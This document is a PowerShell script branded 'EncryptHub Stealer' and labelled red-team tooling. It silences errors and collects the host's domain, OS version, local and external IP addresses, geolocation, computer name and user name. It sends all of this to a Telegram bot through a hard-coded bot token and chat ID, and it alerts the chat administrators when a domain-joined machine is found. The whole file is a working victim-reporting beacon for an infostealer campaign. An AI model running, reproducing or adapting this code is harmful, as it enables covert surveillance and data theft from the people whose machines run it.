param (
    [string]$message
)
#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
#║          _____                             _   _   _       _       ____  _             _             	     ║
#║         | ____|_ __   ___ _ __ _   _ _ __ | |_| | | |_   _| |__   / ___|| |_ ___  __ _| | ___ _ __            ║
#║         |  _| | '_ \ / __| '__| | | | '_ \| __| |_| | | | | '_ \  \___ \| __/ _ \/ _` | |/ _ \ '__|           ║
#║         | |___| | | | (__| |  | |_| | |_) | |_|  _  | |_| | |_) |  ___) | ||  __/ (_| | |  __/ |              ║
#║         |_____|_| |_|\___|_|   \__, | .__/ \__|_| |_|\__,_|_.__/  |____/ \__\___|\__,_|_|\___|_|              ║
#║                                |___/|_|                                                                       ║
#║                                                                                                               ║
#║                                    Red Teaming and Offensive Security                                         ║
#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
#║												   NO ERRORS                                                     ║
#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
$ErrorActionPreference= 'silentlycontinue'
#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
#║												     MAIN                                                        ║
#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
$Messaging = $message
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$compSystem = Get-WmiObject -Class Win32_ComputerSystem
$domain = $null
if ($compSystem.PartOfDomain) {
    $domain = "$($compSystem.Domain)"
} else {
    Write-Output "Domain not found"
}

$botToken = "7484009227:AAEvngzrIKFNFdfSqECzWAqbnB5IXk8pjVo" 
$chatID = "-1002168553106"
$serverIP = "Server IP"
$os = Get-WmiObject Win32_OperatingSystem
$osVersion = $os.Caption
$ipAddress = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq 'Ethernet' -and $_.AddressFamily -eq 'IPv4' }).IPAddress
$ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
$externalIP = $ipInfo.ip
$computerName = $env:COMPUTERNAME
$userName = $env:USERNAME

#----------LOCATION----------
$ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
$location = $ipInfo.loc
$city = $ipInfo.city
$region = $ipInfo.region
$country = $ipInfo.country


if (-not (Test-Connection -ComputerName $serverIP -Count 1 -Quiet)) { 
	if($domain){
	$redExclamation = [char]0x203C
	$messageText = "$Messaging `n$country, $city`nIP: $externalIP/$ipAddress `nOS: $osVersion`nPC Name: $computerName`nUser Name: $userName `n$($redExclamation)Domain: <b>$domain</b>"
	$adminResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getChatAdministrators?chat_id=$chatID" -Method Get
	$admins = $adminResponse.result
		foreach ($admin in $admins) {
			$adminId = $admin.user.id
			$sendMessageParams = @{
				chat_id = $adminId
				text = $messageText
				parse_mode = "HTML"
			}
			$jsonParams = $sendMessageParams | ConvertTo-Json -Depth 10
			$utf8JsonParams = [System.Text.Encoding]::UTF8.GetBytes($jsonParams)
			try {
				Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType "application/json" -Body $utf8JsonParams
			} catch {
				Write-Output "Restricted"
			}
		}
	}
	else{
		$messageText = "$Messaging `n$country, $city`nIP: $externalIP/$ipAddress `nOS: $osVersion`nPC Name: $computerName`nUser Name: $userName"
		$sendMessageParams = @{
			chat_id = $chatId
			text = $messageText
			parse_mode = "HTML"
		}

		$jsonParams = $sendMessageParams | ConvertTo-Json -Depth 10
		$utf8JsonParams = [System.Text.Encoding]::UTF8.GetBytes($jsonParams)

		Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType "application/json" -Body $utf8JsonParams
	}
}